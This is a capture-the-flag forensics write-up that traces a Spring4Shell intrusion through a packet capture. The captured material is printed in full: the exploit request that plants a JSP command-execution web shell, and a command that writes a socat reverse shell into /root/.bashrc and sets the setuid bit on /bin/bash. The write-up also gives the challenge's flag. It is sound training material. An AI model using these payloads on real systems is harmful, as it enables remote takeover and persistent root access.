# Wrong Spooky Season



> “I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong.” Now there is an internal breach in the `Spooky Network` and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did.

> Difficulty: Easy

{% file src="../../.gitbook/assets/forensics_wrong_spooky_season.zip" %}

Let's check file

```shell
┌──(kali㉿kali)-[~/Desktop/HackTheBoo/Wrong-Spooky-Season]
└─$ file forensics_wrong_spooky_season.zip 
forensics_wrong_spooky_season.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/HackTheBoo/Wrong-Spooky-Season]
└─$ unzip forensics_wrong_spooky_season.zip 
Archive:  forensics_wrong_spooky_season.zip
  inflating: capture.pcap            
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/HackTheBoo/Wrong-Spooky-Season]
└─$ file capture.pcap                     
capture.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
```

We have <mark style="color:yellow;">pcap</mark> file!

Use <mark style="color:red;">Wireshark</mark> open it.

<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

We have a lot of TCP and HTTP protocol. Let's check it

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Filter <mark style="color:blue;">HTTP</mark>, We can see <mark style="color:orange;">**ip.src = 192.168.1.180**</mark> <mark style="color:orange;"></mark><mark style="color:orange;"></mark> (Attacker) sent a POST request&#x20;

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Follow TCP stream we can see the URLencoded:

{% code overflow="wrap" %}
```java
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=e4d1c32a56ca15b3&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```
{% endcode %}

Use CyberChef decode this

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```java
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}i java.io.InputStream in = %{c}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=e4d1c32a56ca15b3&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```
{% endcode %}

Check google I know it is a Spring4Shell

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

&#x20;In this packet, Hacker is installing <mark style="color:red;">socat</mark> in the victim system and use reverse shell

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```basic
echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash
```
{% endcode %}

In this we can see base64 encode so suspicious, check it

```python
import base64
a = "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS"[::-1]
print(base64.b64decode(a))
```

We got flag:&#x20;

{% hint style="info" %}
HTB{j4v4\_5pr1ng\_just\_b3c4m3\_j4v4\_sp00ky!!}
{% endhint %}
